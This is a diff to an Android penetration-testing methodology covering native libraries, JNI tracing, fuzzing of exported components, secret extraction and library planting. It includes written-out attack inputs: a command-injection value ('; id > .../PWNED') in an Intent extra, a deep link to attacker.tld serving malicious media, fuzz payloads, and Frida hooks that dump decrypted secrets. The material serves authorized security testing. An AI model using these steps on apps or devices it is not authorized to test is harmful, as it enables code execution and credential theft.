   `objdump --syms`, **plus** a concrete disclosure: an internal hostname, a build-server path, a developer's
@@ -744,7 +785,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 | **Severity ceiling** | Low standalone; Medium–High as the lead-in to an unreviewed dependency swap |
 | **VRT** | n/a standalone; `using_components_with_known_vulnerabilities.outdated_software_version` (P5) or D17's path once you identify the swapped binary |
 | **Attacker** | n/a (recon); AM-09 if the compat remedy downloads a replacement `.so` |
-| **Applies to** | **Android 15+** devices with 16 KB pages; NDK apps must support 16 KB page sizes. `android:pageSizeCompat` needs the Android 16 SDK |
+| **Applies to** | **Android 15+** devices with 16 KB pages; NDK apps must support 16 KB page sizes, and Google Play requires it for new apps and updates targeting Android 15+ since 1 Nov 2025 — a 4 KB-only library in a current build is either an unreviewed prebuilt or a `pageSizeCompat` opt-out worth reading. `android:pageSizeCompat` needs the Android 16 SDK |
 | **Requires** | native, api>=35 |
 | **Maps to** | `developer.android.com/about/versions/15/behavior-changes-all` (16 KB page size support required for NDK apps); `developer.android.com/about/versions/16/behavior-changes-all` (`android:pageSizeCompat`); AOSP "16 KB page size support" |
 
@@ -754,13 +795,13 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   update.
 - **How:**
   ```bash
-  for f in x/lib/arm64-v8a/*.so; do
+  for f in "$LIBS"/lib/arm64-v8a/*.so; do
     echo "== $f"
-    readelf -lW "$f" | awk '/LOAD/ {print $NF}' | sort -u | head -3
-    readelf -pcomment "$f" 2>/dev/null | head -3
+    $READELF -lW "$f" | awk '/LOAD/ {print $NF}' | sort -u | head -3
+    $READELF -pcomment "$f" 2>/dev/null | head -3
   done
-  adb shell getconf PAGE_SIZE
-  grep -nE 'android:pageSizeCompat' x/AndroidManifest.xml
+  adb -s "$SERIAL" shell getconf PAGE_SIZE   # the device must actually run 16 KB pages (a 16 KB developer option or the emulator '16k' image): 4096 here means this check is UNTESTED, not negative
+  grep -nE 'android:pageSizeCompat' "$DEC/apktool/AndroidManifest.xml"
   ```
 - **Proof:** Two alignment values across libraries in the same APK, or one `.so` whose `.comment` section
   names a different toolchain from the rest — pointing at a prebuilt binary nobody audited. Pair it with
@@ -788,15 +829,28 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   — without disassembling a single instruction, and including the methods bound by `RegisterNatives`.
 - **How:**
   ```bash
-  pip install jnitrace
-  jnitrace -l libtarget.so com.target.app | tee jni.log
-  jnitrace -l '*' com.target.app | tee jni-all.log          # noisy; use once, then narrow
+  # jnitrace has had no release since the Frida 15 era and uses legacy Gum APIs: it needs its own venv pinned to
+  # the Frida it was written for AND a matching frida-server on the device. Record which tool produced the trace in the log header.
+  python3 -m venv ~/.venv/jnitrace && ~/.venv/jnitrace/bin/pip install "frida<16" "frida-tools<12" jnitrace
+  ~/.venv/jnitrace/bin/jnitrace -l libtarget.so "$PKG" | tee jni.log
+  ~/.venv/jnitrace/bin/jnitrace -l '*' "$PKG" | tee jni-all.log          # noisy; use once, then narrow
   grep -E 'NewStringUTF|GetStringUTFChars|GetByteArrayElements|GetArrayLength|CallObjectMethod|GetStaticFieldID|SetByteArrayRegion' jni.log
   # generic native tracing when jnitrace is blocked or the symbol is stripped
-  frida-trace -U -i 'Java_*' com.target.app
-  frida-trace -U -i 'open' -i 'memcpy' -i 'strcpy' -i 'sprintf' com.target.app
+  frida-trace -D "$SERIAL" -i 'Java_*' "$PKG"
+  frida-trace -D "$SERIAL" -i 'open' -i 'memcpy' -i 'strcpy' -i 'sprintf' "$PKG"
   frida-trace -p 1372 -a 'libtarget.so!0x4793c'             # stripped: trace by address
-  frida-trace -U -j '*!*certificate*/isu' com.target.app    # Java side, case-insensitive, with signatures
+  frida-trace -D "$SERIAL" -j '*!*certificate*/isu' "$PKG"    # Java side, case-insensitive, with signatures
+  ```
+  When the pinned venv is not acceptable on the harness, the Frida-17 fallback is `frida-trace -i 'Java_*'`
+  above plus a JNIEnv-table hook for the few functions that matter (`GetByteArrayElements`, `GetArrayLength`,
+  `NewStringUTF`, `GetStringUTFChars`):
+  ```javascript
+  // JNIEnv function table: index 167 = NewStringUTF (jni.h order); same pattern for GetArrayLength (171), GetByteArrayElements (184)
+  Java.perform(() => {
+    const env = Java.vm.getEnv(); const fnTable = env.handle.readPointer();
+    const NewStringUTF = fnTable.add(167 * Process.pointerSize).readPointer();
+    Interceptor.attach(NewStringUTF, { onEnter(a) { console.log('NewStringUTF ' + a[1].readUtf8String()); } });
+  });
   ```
   `frida-trace` writes an editable handler per matched function under `__handlers__/<module>/<fn>.js`; edit
   `onLeave` to capture return values:
@@ -836,9 +890,9 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   three boundaries: `len > actual`, `offset` negative, and `offset + len` wrapping.
 - **How:** Find the shape statically, then drive it:
   ```bash
-  grep -rnE 'native .*\(byte\[\]|native .*\(java\.nio\.ByteBuffer|native .*\(\[BII' out/sources/ | head -40
+  grep -rnE 'native .*\(byte\[\]|native .*\(java\.nio\.ByteBuffer|native .*\(\[BII' "$DEC/jadx/sources" | head -40
   # in the disassembly, look for the length being used without a GetArrayLength comparison
-  r2 -A x/lib/arm64-v8a/libtarget.so
+  r2 -A "$LIBS"/lib/arm64-v8a/libtarget.so
   # [0x0]> afl ; axt @ sym.imp.memcpy ; axt @ sym.imp.GetArrayLength
   ```
   Call the entry directly from an instrumented process — this is for *triage*, not for the report (see
@@ -885,8 +939,9 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 - **How:** Run the same input three ways and diff the observable:
   ```bash
   # (a) through the real surface
-  adb shell am start -n com.target/.ImportActivity --es blob "$(python3 -c 'print("A"*100000)')"
-  adb logcat -d | grep -E 'IllegalArgument|IndexOutOfBounds|SIGSEGV|target'
+  # the WHOLE device command is one double-quoted argument; the extra is single-quoted for the device shell
+  adb -s "$SERIAL" shell "am start -n $PKG/.ImportActivity --es blob '$(python3 -c 'print("A"*100000)')'"
+  adb -s "$SERIAL" logcat -d | grep -E 'IllegalArgument|IndexOutOfBounds|SIGSEGV|target'
   ```
   ```javascript
   // (b) at the Java wrapper, to see whether the wrapper or the native side rejected
@@ -898,7 +953,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
     };
   });
   // (c) at the native symbol, to prove the bytes crossed
-  Interceptor.attach(Module.getExportByName('libtarget.so','Java_com_target_Codec_decode'), {
+  Interceptor.attach(Process.getModuleByName('libtarget.so').getExportByName('Java_com_target_Codec_decode'), {   // Frida ≥ 17 form
     onEnter(a) { console.log('[native] entered len=' + a[4].toInt32()); }
   });
   ```
@@ -928,14 +983,14 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   noise; `strcpy` two call frames from `Java_com_target_Codec_decode` is a finding candidate.
 - **How:**
   ```bash
-  for so in x/lib/arm64-v8a/*.so; do
+  for so in "$LIBS"/lib/arm64-v8a/*.so; do
     echo "== $so"
     nm -D "$so" 2>/dev/null | grep -E ' U (strcpy|strcat|strncpy|sprintf|vsprintf|gets|memcpy|memmove|alloca|system|popen|execve)$'
   done
   ```
   Then walk the cross-references from the sink back to the entry:
   ```bash
-  r2 -A x/lib/arm64-v8a/libtarget.so
+  r2 -A "$LIBS"/lib/arm64-v8a/libtarget.so
   # [0x0]> afl                    # function list
   # [0x0]> axt @ sym.imp.memcpy   # every caller of memcpy
   # [0x0]> axt @ sym.imp.strcpy
@@ -968,20 +1023,27 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   memory-safety argument is required.
 - **How:**
   ```bash
-  grep -rn 'Runtime.getRuntime()\.exec\|ProcessBuilder' out/sources/ | head -30
-  grep -rn 'Runtime;->exec\|ProcessBuilder' out/smali/ | head -30
-  strings -a x/lib/*/*.so | grep -E '^/system/bin/(sh|toolbox|toybox)$|^popen$|^system$|sh -c' | sort -u
-  nm -D x/lib/*/*.so | grep -E ' U (system|popen|execve|execl|fork)$'
-  frida-trace -U -f com.target.app -i 'execve' -i 'popen' -i 'system'
+  grep -rn 'Runtime.getRuntime()\.exec\|ProcessBuilder' "$DEC/jadx/sources" | head -30
+  grep -rn 'Runtime;->exec\|ProcessBuilder' "$DEC"/apktool/smali*/ | head -30
+  strings -a "$LIBS"/lib/*/*.so | grep -E '^/system/bin/(sh|toolbox|toybox)$|^popen$|^system$|sh -c' | sort -u
+  nm -D "$LIBS"/lib/*/*.so | grep -E ' U (system|popen|execve|execl|fork)$'
+  frida-trace -D "$SERIAL" -f "$PKG" -i 'execve' -i 'popen' -i 'system'
   ```
-  Inject a separator through the reachable parameter and read the result back from inside the app's sandbox:
+  Inject a separator through the reachable parameter and read the marker back. The WHOLE device command is one
+  double-quoted argument and the extra is single-quoted for the device shell — otherwise the device `sh -c`
+  re-parses the `;`, truncates the extra and runs `id > …` itself as the adb shell user (uid 0 on a rooted
+  harness: a fabricated positive). `run-as` works only on debuggable packages (D16-042), so the marker goes
+  where shell can read it without it:
   ```bash
-  adb shell am start -n com.target/.ExportedActivity \
-    --es path '/sdcard/a.log; id > /data/data/com.target.app/files/PWNED'
-  adb shell run-as com.target.app cat files/PWNED
+  adb -s "$SERIAL" shell "am start -n $PKG/.ExportedActivity --es path '/sdcard/a.log; id > /sdcard/Android/data/$PKG/files/PWNED'"
+  adb -s "$SERIAL" shell cat "/sdcard/Android/data/$PKG/files/PWNED"     # app-specific external dir: readable by shell, no run-as
+  adb -s "$SERIAL" shell su -c "cat /data/data/$PKG/files/PWNED"          # rooted harness only: AM-12 for READING evidence, never for the delivery
   ```
+  (The app-specific external directory must exist — any flow that calls `getExternalFilesDir` creates it.)
 - **Proof:** The marker file containing `uid=10xxx(u0_aXXX)` matching the target's UID. That single line is
-  the whole proof and it shows execution in the app's context — nothing else is needed.
+  the whole proof and it shows execution in the app's context — nothing else is needed. `uid=0` or
+  `uid=2000(shell)` in the marker means the separator was consumed by the adb shell, not the app — re-quote and
+  re-run; it is not a finding.
 - **Escalation:** → D17 for persistence (write a `.so`/DEX the app later loads). If the app ever invokes
   `su`, note the amplification but **rate the base case on the app UID** — a rooted device is not an attacker
   model.
@@ -1005,32 +1067,37 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   authorises, not from where it was hidden.
 - **How:**
   ```bash
-  strings -a -n 8 x/lib/arm64-v8a/libnative.so | \
+  strings -a -n 8 "$LIBS"/lib/arm64-v8a/libnative.so | \
     grep -iE 'key|secret|token|passw|hmac|https?://|Bearer|AKIA|AIza|sk_live' | head -40
-  nm -D --defined-only x/lib/arm64-v8a/libnative.so | head -50
+  nm -D --defined-only "$LIBS"/lib/arm64-v8a/libnative.so | head -50
   ```
   When the value is derived rather than stored, take it at the boundary:
   ```javascript
-  Interceptor.attach(Module.getExportByName('libnative.so', 'Java_com_target_NativeBridge_getSecret'), {
+  Interceptor.attach(Process.getModuleByName('libnative.so').getExportByName('Java_com_target_NativeBridge_getSecret'), {   // Frida ≥ 17
     onLeave(ret) {
       console.log('[ret] ' + Java.vm.getEnv().getStringUtfChars(ret, null).readCString());
     }
   });
   // or the generic crypto boundary
-  Interceptor.attach(Module.getExportByName('libnative.so', 'decrypt'), {
+  Interceptor.attach(Process.getModuleByName('libnative.so').getExportByName('decrypt'), {
     onEnter(a) { console.log('[+] in : ' + a[0].readUtf8String()); },
     onLeave(r) { console.log('[+] out: ' + r.readUtf8String()); }
   });
-  Module.enumerateExports('libnative.so').forEach(e => console.log(e.name + ' @ ' + e.address));
+  Process.getModuleByName('libnative.so').enumerateExports().forEach(e => console.log(e.name + ' @ ' + e.address));
   ```
   ```bash
-  jnitrace -l libnative.so com.target.app | grep -A3 NewStringUTF
-  frida-trace -U -i 'decrypt' com.target.app
+  jnitrace -l libnative.so "$PKG" | grep -A3 NewStringUTF     # pinned venv / fallback: D16-017
+  frida-trace -D "$SERIAL" -i 'decrypt' "$PKG"
   ```
-- **Proof:** The plaintext value printed from the running app **and** an out-of-band validation: the key
-  produces a signature the backend accepts, or returns 200 from the vendor API. A recovered string with no
-  demonstrated use is Informational.
-- **Escalation:** → D12 (key management) for the storage decision; → D15 for the real impact — a recovered
+- **Proof:** The plaintext value printed from the running app **and** an out-of-band validation limited to
+  **one** benign authenticated request (the docs/02 key rule): a read of a harmless resource or an `OPTIONS`,
+  captured with status line and redacted body — never a mutating call, never a second request. Record which
+  asset the credential authenticates to and who owns it: a partner/third-party endpoint is
+  `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) unless the programme lists that
+  partner in scope; a first-party production endpoint is `.for_publicly_accessible_asset` (P1). A recovered
+  string with no demonstrated use is Informational.
+- **Escalation:** → D14/D15 to check whether the credential is scope-restricted server-side (IP allow-list,
+  mTLS) — the restriction is what decides P1 vs P3. → D12 (key management) for the storage decision; → D15 for the real impact — a recovered
   **request-signing** key lets an attacker forge valid requests from outside the app, which un-gates every
   other API finding in the engagement and is frequently the highest-value outcome of a mobile assessment.
   It is also the bridge to the shadow-API work: the signing key is what lets you exercise the app's older,
@@ -1050,18 +1117,20 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 | **Requires** | native, device, frida |
 | **Maps to** | MASVS-RESILIENCE-3; MASTG-TECH-0034, MASTG-TOOL-0036 (r2frida); Mobile Top 10 2024 M7 |
 
-- **Test:** Do not report "root detection can be bypassed" — that is P5 by definition. The only question worth
+- **Test:** **Owner: D21-033** (detection that gates a security decision — rate what the bypass unlocked);
+  this item adds only the native variant: the libc-call hook and the native-pinning note. Do not report
+  "root detection can be bypassed" — that is P5 by definition. The only question worth
   answering is whether the native detection result **gates a security decision**. Trace the return value to a
   decision point.
 - **How:**
   ```bash
-  nm -D x/lib/*/*.so | grep -iE 'root|jail|emul|debug|tamper|integrity|attest'
-  strings -a x/lib/*/*.so | grep -E '^/system/(bin|xbin)/su$|magisk|frida|/proc/self/maps|ro.debuggable'
+  nm -D "$LIBS"/lib/*/*.so | grep -iE 'root|jail|emul|debug|tamper|integrity|attest'
+  strings -a "$LIBS"/lib/*/*.so | grep -E '^/system/(bin|xbin)/su$|magisk|frida|/proc/self/maps|ro.debuggable'
   ```
   Watch the libc calls the check actually makes, which is faster than reversing it:
   ```javascript
   ['fopen','open','access','stat','lstat','system','popen'].forEach(function (fn) {
-    var p = Module.findExportByName('libc.so', fn); if (!p) return;
+    var p = Process.getModuleByName('libc.so').findExportByName(fn); if (!p) return;   // Frida ≥ 17 form
     Interceptor.attach(p, {
       onEnter(a) { this.path = a[0].readUtf8String(); },
       onLeave(r) { console.log('[' + fn + '] ' + this.path + ' -> ' + r); }
@@ -1070,7 +1139,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   ```
   Then flip the result and see what changes:
   ```bash
-  r2 frida://attach/usb//com.target.app      # :il to find the module, :dm for its map
+  r2 "frida://attach/usb/$SERIAL/$PKG"       # :il to find the module, :dm for its map
   ```
 - **Proof:** Either (a) the detection return value flows into a payment/DRM/login branch — quote the branch
   at `file:line` and show the app behaving differently when you flip it; or (b) it flows only into an
@@ -1101,7 +1170,8 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 - **How:** In source or decompilation, grep the arithmetic near allocations; in a binary diff on AArch64,
   look for `madd`/`mul` on `w` registers becoming `umull` on `x` registers plus a `tst …, #0xffffffff00000000`.
   ```bash
-  grep -rnE '(malloc|calloc|realloc|new\s+\w+\[|memcpy|memset)\s*\(' native-src/ -B4 | \
+  SRC=${SRC:-$E/native-src/<library>}        # the upstream source checkout at the version D16-006 fingerprinted (populated in D16-045); every source grep below reads it
+  grep -rnE '(malloc|calloc|realloc|new\s+\w+\[|memcpy|memset)\s*\(' "$SRC" -B4 | \
     grep -nE '[a-z_]+ *\* *[a-z_]+|\* *sizeof'
   # UBSan is the fastest oracle — rebuild the parser and run the corpus through it
   clang++ -O1 -g -fsanitize=integer,undefined -fno-sanitize-recover=all harness.cc -o h && ./h seed
@@ -1149,8 +1219,8 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   unsigned count into a small negative one, which then passes a `< max` check and allocates far too little.
 - **How:**
   ```bash
-  grep -rnE '\((short|int16_t|FT_Short|s16|int8_t|char)\)\s*[A-Za-z_]' native-src/ | head -40
-  grep -rnE 'FT_Short|short\s+[a-z_]+\s*=\s*.*(read|get|parse)' native-src/ | head -40
+  grep -rnE '\((short|int16_t|FT_Short|s16|int8_t|char)\)\s*[A-Za-z_]' "$SRC" | head -40
+  grep -rnE 'FT_Short|short\s+[a-z_]+\s*=\s*.*(read|get|parse)' "$SRC" | head -40
   ```
   Then craft inputs at the boundary: `0x7FFF`, `0x8000`, `0x8001`, `0xFFFD`, `0xFFFE`, `0xFFFF`, and the same
   values in the container's byte order. Run the parser under ASan.
@@ -1181,8 +1251,8 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   the *unwrapped* value — or advances by zero and loops forever, reading deeper into unallocated heap.
 - **How:**
   ```bash
-  grep -rnE '\+\s*[0-9]+\s*\)?\s*(<=|<)\s*' native-src/ | grep -iE 'size|len|remain|avail|bound' | head -40
-  grep -rnE '(cur|read|pos|off)[a-z_]*\s*\+=' native-src/ | head -40
+  grep -rnE '\+\s*[0-9]+\s*\)?\s*(<=|<)\s*' "$SRC" | grep -iE 'size|len|remain|avail|bound' | head -40
+  grep -rnE '(cur|read|pos|off)[a-z_]*\s*\+=' "$SRC" | head -40
   ```
   Test the value at `SIZE_MAX - constant + k` for `k` in `0..8`, and separately test for the **zero-advance
   infinite loop** by watching whether the parser's read offset stops moving:
@@ -1365,7 +1435,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 | **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) with control; **P3** for the arbitrary-free crash alone |
 | **Attacker** | **AM-03** — a zero-permission installed app; this is the cheapest attacker model in the whole chapter |
 | **Applies to** | any app with an exported component; **any exported component that reads a single extra deserialises the WHOLE Bundle** |
-| **Requires** | native, exported-activity, exported-service, exported-receiver, provider |
+| **Requires** | native |
 | **Maps to** | CWE-416, CWE-502; MASWE-0050; MASTG-KNOW-0005; known gadgets `OpenSSLX509Certificate` and `com.android.internal.util.VirtualRefBasePtr(mNativePtr)` |
 
 - **Test:** A Java class that stores a native heap pointer in a **non-transient** `long` field, and passes it
@@ -1373,7 +1443,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   deserialised from an Intent extra. The attacker sets the pointer to any address; the victim's GC frees it.
 - **How:**
   ```bash
-  S=out/sources
+  S="$DEC/jadx/sources"
   grep -rnE 'private .*long [a-zA-Z_]*[Pp]tr|long mNative|long nativeHandle|long mNativePtr' $S
   grep -rnE 'native (void|int) (free|destroy|release|delete)[A-Za-z]*\(long' $S
   grep -rn -A6 'protected void finalize' $S | grep -nE 'native|free|destroy|nativePtr'
@@ -1454,7 +1524,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 - **How:**
   ```bash
   # in decompilation: indices that are signed and unvalidated
-  grep -rnE '\[[a-z_]+\]\s*=' native-src/ -B3 | grep -nE '(int|short|char)\s+[a-z_]+\s*=.*(read|parse|get)'
+  grep -rnE '\[[a-z_]+\]\s*=' "$SRC" -B3 | grep -nE '(int|short|char)\s+[a-z_]+\s*=.*(read|parse|get)'
   # in the binary: signed compares guarding an index
   r2 -A lib.so
   # [0x0]> /a ldrsb ; /a ldrsh ; /a sxtw          # sign-extension near an index computation
@@ -1524,7 +1594,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 | **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) with execution; `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (**P3**) for a reliable controlled crash. Compare the band you are escaping: a pure **Java**-layer crash from the same vector is `application_level_denial_of_service_dos.app_crash.malformed_android_intents` = **P5**, worth nothing |
 | **Attacker** | **AM-03** zero-permission local app (prove it from a real attacker APK, not from `adb`, which runs as the far-more-privileged shell UID) |
 | **Applies to** | any app whose D16-005 table has a row reachable from an exported activity, receiver, service or provider |
-| **Requires** | native, device, exported-activity, exported-service, exported-receiver, provider |
+| **Requires** | native, device |
 | **Maps to** | MASTG-KNOW-0005, MASTG-TECH-0044; MASWE-0050; ATT&CK T1575, T1658; CWE-787 |
 
 - **Test:** Drive the exported entry point that reaches native code with oversized, negative, truncated and
@@ -1532,15 +1602,18 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   difference between a P5 app crash and a memory-safety finding.
 - **How:**
   ```bash
-  adb logcat -c
-  adb shell am start -n com.target/.ImportActivity -d "file:///sdcard/fuzz/case0001"
-  adb shell am start -n com.target/.ImportActivity --es blob "$(python3 -c 'print("A"*100000)')"
-  adb shell am start -n com.target/.ImportActivity --ei offset -1 --ei len 2147483647
-  adb shell am broadcast -n com.target/.ImportReceiver --es payload "$(python3 -c 'print("\ud800"*4096)')"
-  adb shell content call --uri content://com.target.provider --method parse --arg "$(python3 -c 'print("A"*70000)')"
-  adb logcat -b crash -d | grep -A30 'signal 11\|SIGSEGV\|SIGABRT\|Abort message\|backtrace:'
-  adb shell ls -t /data/tombstones/ | head -1
-  adb bugreport crash.zip     # the tombstone is under FS/data/tombstones/ when you cannot read it directly
+  adb -s "$SERIAL" logcat -c
+  # every device command is ONE double-quoted argument with the extra single-quoted for the device shell (an unquoted ';' or '"' is re-parsed there)
+  adb -s "$SERIAL" shell "am start -n $PKG/.ImportActivity -d 'file:///sdcard/fuzz/case0001'"
+  adb -s "$SERIAL" shell "am start -n $PKG/.ImportActivity --es blob '$(python3 -c 'print("A"*100000)')'"
+  adb -s "$SERIAL" shell "am start -n $PKG/.ImportActivity --ei offset -1 --ei len 2147483647"
+  # UTF-16 surrogates cannot cross adb shell as UTF-8 (python3 raises 'surrogates not allowed'; the device shell may replace the bytes):
+  # deliver them from the attacker APK — i.putExtra("payload", "\uD800".repeat(4096)); — which is the AM-03 proof anyway. Triage-only shot:
+  adb -s "$SERIAL" shell "am broadcast -n $PKG/.ImportReceiver --es payload '$(python3 -c 'import sys; sys.stdout.buffer.write("\ud800".encode("utf-8","surrogatepass")*4096)')'"
+  adb -s "$SERIAL" shell "content call --uri content://$PKG.provider --method parse --arg '$(python3 -c 'print("A"*70000)')'"
+  adb -s "$SERIAL" logcat -b crash -d | grep -A30 'signal 11\|SIGSEGV\|SIGABRT\|Abort message\|backtrace:'
+  adb -s "$SERIAL" shell ls -t /data/tombstones/ | head -1
+  adb -s "$SERIAL" bugreport crash.zip     # the tombstone is under FS/data/tombstones/ when you cannot read it directly
   ```
   Then re-prove it from an attacker APK with an empty `<uses-permission>` set, and commit that manifest as
   evidence — a finding proved only with `adb` has not established AM-03.
@@ -1626,21 +1699,26 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 
 - **Test:** The prime remote surface is not a parser the app exposes — it is a decoder the app *calls* on
   bytes it fetched. Establish (a) which decoder, (b) whether the URL is attacker-influenceable, (c) whether
-  the fetch carries the app's credentials.
+  the fetch carries the app's credentials, and (d) whether the bytes are fetched directly or through a
+  first-party transform/re-encoding proxy (a CDN image service, a thumbnailer, a `…/proxy?url=` resizer). A
+  proxy that re-encodes is a mitigating layer: the decoder sees the proxy's output, not yours.
 - **How:**
   ```bash
-  S=out/sources
+  S="$DEC/jadx/sources"
   grep -rnE 'Glide\.with|Coil|Fresco|ImageDecoder\.|BitmapFactory\.decode|MediaItem\.fromUri|setMediaItem|createMediaSource|HlsMediaSource|DashMediaSource|ProgressiveMediaSource|setSubtitleConfigurations' $S | head -40
   grep -rn 'MediaItem.fromUri' -B12 $S | grep -nE 'getIntent|getQueryParameter|extras|push'
   # what does the decoder actually resolve to?
-  strings -a x/lib/*/libavif_android.so 2>/dev/null | grep -iE 'dav1d|libavif|[0-9]+\.[0-9]+\.[0-9]+'
+  strings -a "$LIBS"/lib/*/libavif_android.so 2>/dev/null | grep -iE 'dav1d|libavif|[0-9]+\.[0-9]+\.[0-9]+'
   adb shell am start -a android.intent.action.VIEW \
     -d 'target://play?src=https://attacker.tld/evil.m3u8&sub=https://attacker.tld/a.vtt'
   ```
-  Serve malformed bytes from your own host and watch the native side:
+  Serve malformed bytes from your own host and watch the native side — and first prove the bytes arrive
+  unmodified (served hash = received hash, same format):
   ```bash
   python3 -m http.server 8080 --directory ./malformed &
-  adb logcat -b crash -d | grep -A30 'signal 11'
+  mitmdump -q -w "+$E/requests/D16-037-$(date +%s).mitm" &     # per-run flow file: does the request go to your host or to a first-party transform proxy?
+  curl -s "$FINAL_URL" -o got.bin; shasum -a 256 served.bin got.bin; file served.bin got.bin   # identical hash/format = direct path
+  adb -s "$SERIAL" logcat -b crash -d | grep -A30 'signal 11'
   ```
 - **Proof:** Your host receives the request (with the app's User-Agent and any `Authorization` header — log
   the headers, they are half the finding), and the app either renders your content or crashes in the native
@@ -1653,6 +1731,8 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 - **Ruled out when:** every media/image URL the app loads comes from a fixed allowlist of first-party hosts
   over pinned TLS, with no deep-link, push-payload, QR or WebView-bridge path able to set it — traced from
   each `Glide.with(...).load(X)` call site to the origin of `X`.
+  …or every remote image/media URL is rewritten to a first-party transform proxy that re-encodes (served bytes ≠
+  received bytes, format normalised), with no parameter that disables the transform — show the request pair.
 
 ### D16-038 · Same-process HALs: vendor GPU code inside the app's address space, holding a kernel fd
 
@@ -1675,7 +1755,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   adb shell cat /proc/$PID/maps | grep -E 'vendor|/apex/|libGLES|libvulkan|libRS|mali|adreno|powervr'
   adb shell ls -l /dev/kgsl-3d0 /dev/mali0 /dev/dri/* 2>/dev/null
   adb shell ls -lZ /proc/$PID/fd/ | grep -E 'kgsl|mali|dri'
-  grep -RnE 'RenderScript|ScriptC|GLSurfaceView|Vulkan|SurfaceTexture|ImageDecoder|BitmapFactory\.decode' out/sources/
+  grep -RnE 'RenderScript|ScriptC|GLSurfaceView|Vulkan|SurfaceTexture|ImageDecoder|BitmapFactory\.decode' "$DEC/jadx/sources"
   ```
 - **Proof:** `/proc/<pid>/maps` showing `/vendor/lib64/egl/libGLES_mali.so` (or the Adreno/PowerVR
   equivalent) mapped into the app process, together with `/proc/<pid>/fd` holding an open GPU device node —
@@ -1684,7 +1764,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   **Android 16** blocks deprecated/development Mali GPU IOCTLs in production and restricts profiling IOCTLs
   to shell or debuggable apps. Look for the workaround:
   ```bash
-  adb logcat -b events -d | grep 'avc:.*denied.*dev/mali0'
+  adb -s "$SERIAL" logcat -d | grep -E 'avc: *denied.*(mali|kgsl|dri)'     # AVC denials are in the main buffer (and dmesg), not -b events
   adb shell dmesg | grep -i 'avc.*mali'
   aapt2 dump badging base.apk | grep -i debuggable
   ```
@@ -1700,20 +1780,23 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 | **Severity ceiling** | Critical |
 | **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) |
 | **Attacker** | **AM-03** (a co-located app writing the file) or AM-09 (the app downloads it) |
-| **Applies to** | **API gate:** apps targeting **API 29+** cannot execute native code from the app's *internal* data storage — the external-storage and pre-29 variants remain live. Also check `android:extractNativeLibs`: with `extractNativeLibs="false"` (the AGP 3.6 / targetSdk-30-era default) libraries load uncompressed from the APK and there is no `lib-*/` directory to overwrite |
+| **Applies to** | all apps that call `System.load()`/`dlopen()` on a path outside their own APK. **Precision on the API 29 change:** Android 10 blocks `exec()` of files in the app home directory (W^X for *executables*); it does **not** block `dlopen()`/`System.load()` of a `.so` in `files/`, `cache/`, `code_cache/` or external storage — library planting stays live at every targetSdk, which is why the worked cases below are post-29. The only structural kill is `android:extractNativeLibs="false"` (the AGP ≥ 3.6 default for minSdk ≥ 23) **combined with** no `System.load()` of an absolute path, because then there is no `lib-*/` directory and no writable load path |
 | **Requires** | native |
 | **Maps to** | ATT&CK T1625.001 (System Runtime API Hijacking), T1407 (Download New Code at Runtime, mitigation M1006), T1575; CWE-829, CWE-494; H1 #1377748 (Evernote, High), #1115864 (Mattermost, High 7.8) |
 
-- **Test:** Find every loader and where it reads from. `System.load()` on an absolute path under the data
+- **Test:** **Owner: D17-013** (native library loaded from a writable path). Run it against the loader list
+  from D16-002; this chapter adds only the constructor payload, the `extractNativeLibs` note and the API-29
+  precision above. Find every loader and where it reads from. `System.load()` on an absolute path under the data
   directory, the cache, or external storage — or a `dlopen()` on a downloaded file — is a library-planting
   primitive and therefore code execution as the app.
 - **How:**
   ```bash
-  grep -rnE 'System\.load\(|System\.loadLibrary\(|dlopen|LD_LIBRARY_PATH|getExternalFilesDir|getExternalCacheDir|Environment\.getExternalStorage' out/sources/
-  strings -a x/lib/*/*.so | grep -E '^/sdcard|^/storage|^/data/data/.*/(cache|files)/'
-  grep -n 'extractNativeLibs' x/AndroidManifest.xml
-  adb shell run-as com.target.app ls -la /data/data/com.target.app/lib-1/ /data/data/com.target.app/lib-main/ 2>/dev/null
-  adb shell getprop ro.product.cpu.abi
+  grep -rnE 'System\.load\(|System\.loadLibrary\(|dlopen|LD_LIBRARY_PATH|getExternalFilesDir|getExternalCacheDir|Environment\.getExternalStorage' "$DEC/jadx/sources"
+  strings -a "$LIBS"/lib/*/*.so | grep -E '^/sdcard|^/storage|^/data/data/.*/(cache|files)/'
+  grep -n 'extractNativeLibs' "$DEC/apktool/AndroidManifest.xml"
+  adb -s "$SERIAL" shell pm dump "$PKG" | grep -E 'nativeLibraryDir|legacyNativeLibraryDir|primaryCpuAbi'   # no root needed
+  adb -s "$SERIAL" shell su -c "ls -la /data/data/$PKG/" | grep -E 'lib|\.so'                            # rooted harness; run-as needs a debuggable build (D16-042)
+  adb -s "$SERIAL" shell getprop ro.product.cpu.abi
   ```
